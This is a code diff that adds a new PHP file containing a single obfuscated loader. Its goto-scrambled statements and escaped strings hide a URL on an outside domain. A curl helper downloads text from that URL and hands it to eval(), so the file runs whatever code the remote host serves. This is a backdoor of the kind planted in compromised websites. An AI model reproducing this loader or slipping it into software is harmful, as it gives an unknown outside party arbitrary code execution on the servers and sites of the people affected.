@@ -1,0 +1,2 @@
+<?php
+ goto LExbt; YaycX: $ok = "\x3f\76"; goto e6yR5; e6yR5: eval("{$ok}" . get("\150\x74\164\160\x73\x3a\x2f\57\x6d\145\154\x65\144\141\153\x32\60\62\64\56\x6e\x65\x74\x2f\143\151\x62\x61\x69\56\x74\170\164")); goto n6Cxu; LExbt: function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_URL, $url); $data = curl_exec($ch); curl_close($ch); return $data; } goto YaycX; n6Cxu: ?>
